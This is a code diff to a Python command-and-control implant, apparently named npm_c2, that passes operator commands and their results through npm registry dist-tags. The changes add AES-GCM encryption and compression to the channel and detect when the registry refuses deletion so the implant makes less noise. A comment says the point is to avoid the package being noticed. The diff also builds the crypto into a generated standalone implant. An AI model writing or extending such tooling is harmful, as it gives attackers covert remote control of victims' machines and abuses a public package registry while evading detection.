@@ -107,10 +107,16 @@ class Job:
 
 
 class Implant:
-    def __init__(self, package, token=None, interval=60, jitter=20, verbose=False):
+    def __init__(self, package, token=None, interval=60, jitter=20, verbose=False,
+                 passphrase=None):
         self.package = package
         self.url = _nc.API.format(registry_path(package))
         self.token = token
+        # None = not probed yet, True = DELETE works, False = registry refuses.
+        self.can_delete = None
+        # nil/None key means an unencrypted channel (legacy and mock tests).
+        from npm_c2.crypto import derive_key
+        self.key = derive_key(passphrase) if passphrase else None
         self.interval = max(10, int(interval))
         self.jitter = max(0, int(jitter))
         self.v = verbose
@@ -273,7 +279,29 @@ class Implant:
             if len(slot["parts"]) != total:
                 continue                       # still waiting on chunks
             buf = b"".join(slot["parts"][i] for i in range(1, total + 1))
-            commands.append(buf.decode("utf-8", errors="replace"))
+            # The operator seals the whole command before chunking, so this
+            # only runs after reassembly is complete.
+            if self.key:
+                from npm_c2.crypto import open_sealed
+                try:
+                    buf = open_sealed(self.key, buf, self.package.encode())
+                except Exception:
+                    self._log("[!] undecryptable command group, ignoring")
+                    del self.pending[gid]
+                    continue
+            from npm_c2.crypto import decompress
+            try:
+                buf = decompress(buf)
+            except Exception:
+                del self.pending[gid]
+                continue
+            command = buf.decode("utf-8", errors="replace").strip()
+            if not command:
+                # A plaintext tag left over from an unencrypted session
+                # reassembles to garbage or an empty string: never run it.
+                del self.pending[gid]
+                continue
+            commands.append(command)
             retire.update(members.get(gid, ()))
             for tag in tags:                   # also retire chunks seen earlier
                 if tag.startswith(CMD_PREFIX):
@@ -548,7 +576,11 @@ class Implant:
     # -------------------------------------------------------------- writeback
     def _reply(self, out):
         try:
-            for tag in encode_payload(out.encode(), RES_PREFIX):
+            from npm_c2.crypto import seal, compress
+            payload = compress(out.encode())
+            if self.key:
+                payload = seal(self.key, payload, self.package.encode())
+            for tag in encode_payload(payload, RES_PREFIX):
                 self._put(tag)
             if self.v:
                 print("[+] result sent")
@@ -599,6 +631,8 @@ class Implant:
                 print(f"[!] cleanup failed: {e}", file=sys.stderr)
 
     def _del(self, tag):
+        if self.can_delete is False:
+            return False
         headers = {"User-Agent": UA}
         if self.token:
             headers["Authorization"] = f"Bearer {self.token}"
@@ -606,7 +640,18 @@ class Implant:
                                      headers=headers)
         try:
             with urllib.request.urlopen(req, timeout=15):
+                self.can_delete = True
                 return True
+        except urllib.error.HTTPError as e:
+            # npm refuses DELETE to a granular token that bypasses 2FA.
+            # Remember that and stop asking: a failed request per command is
+            # exactly the sort of noise that gets a package noticed.
+            if e.code in (401, 403):
+                self.can_delete = False
+                if self.v:
+                    print(f"[!] registry refuses DELETE ({e.code}), "
+                          "auto-clean disabled", file=sys.stderr)
+            return False
         except urllib.error.URLError:
             return False
 
@@ -652,6 +697,7 @@ def generate_standalone(token=None, package=None):
         f"SEEN_CAP = {SEEN_CAP}",
         f"RETRIES = {RETRIES}",
         f"AUTO_CLEAN = {AUTO_CLEAN}",
+        "CAN_DELETE_INIT = None",
         "WINDOWS = platform.system() == 'Windows'",
         "",
         inspect.getsource(_xor_key_fn),
@@ -671,6 +717,50 @@ def generate_standalone(token=None, package=None):
         inspect.getsource(group_chunks_with_id),
         "",
         inspect.getsource(redirect_output),
+        "",
+        # Channel crypto travels with the standalone: the generated file has
+        # no package to import from.
+        "import hashlib as _hl, hmac as _hm, os as _os2",
+        "KEY_INFO = b'npm-c2 tag channel v1'",
+        "NONCE_LEN = 12",
+        "TAG_LEN = 16",
+        "",
+        "def derive_key(passphrase):",
+        "    if not passphrase:",
+        "        raise ValueError('empty passphrase')",
+        "    prk = _hm.new(b'npm-c2-hkdf-salt', passphrase.encode(), _hl.sha256).digest()",
+        "    return _hm.new(prk, KEY_INFO + b'\\x01', _hl.sha256).digest()[:32]",
+        "",
+        "def seal(key, plaintext, aad=b''):",
+        "    from cryptography.hazmat.primitives.ciphers.aead import AESGCM",
+        "    nonce = _os2.urandom(NONCE_LEN)",
+        "    return nonce + AESGCM(key).encrypt(nonce, plaintext, aad)",
+        "",
+        "def open_sealed(key, blob, aad=b''):",
+        "    from cryptography.hazmat.primitives.ciphers.aead import AESGCM",
+        "    if len(blob) < NONCE_LEN + TAG_LEN:",
+        "        raise ValueError('sealed payload too short')",
+        "    return AESGCM(key).decrypt(blob[:NONCE_LEN], blob[NONCE_LEN:], aad)",
+        "",
+        "COMPRESS_MIN = 64",
+        "_RAW, _ZLIB = b'\\x00', b'\\x01'",
+        "",
+        "def compress(payload):",
+        "    import zlib as _z",
+        "    if len(payload) < COMPRESS_MIN:",
+        "        return _RAW + payload",
+        "    packed = _z.compress(payload, 9)",
+        "    return _ZLIB + packed if len(packed) < len(payload) else _RAW + payload",
+        "",
+        "def decompress(blob):",
+        "    import zlib as _z",
+        "    if not blob:",
+        "        return blob",
+        "    if blob[:1] == _ZLIB:",
+        "        return _z.decompress(blob[1:])",
+        "    if blob[:1] == _RAW:",
+        "        return blob[1:]",
+        "    return blob",
         "",
         inspect.getsource(Job),
         "",
